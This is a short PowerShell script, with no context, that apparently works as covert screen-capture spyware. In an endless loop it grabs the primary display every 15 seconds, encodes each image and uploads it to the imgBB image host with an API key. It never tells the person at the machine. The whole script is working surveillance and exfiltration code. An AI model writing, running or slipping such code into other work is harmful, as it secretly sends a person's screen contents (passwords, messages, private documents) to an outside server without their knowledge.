$apiKey = "API KEY"
$url = "https://api.imgbb.com/1/upload"

while ($true) {
    # Capture screenshot
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $graphics.Dispose()

    # Convert image to base64-encoded string
    $ms = New-Object System.IO.MemoryStream
    $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
    $base64 = [System.Convert]::ToBase64String($ms.ToArray())
    $ms.Dispose()

    # Upload image to imgBB
    $body = @{
        key = $apiKey
        image = $base64
    }
    $response = Invoke-RestMethod -Method Post -Uri $url -Body $body


    # Wait for 15 seconds before taking the next screenshot
    Start-Sleep -Seconds 15
}
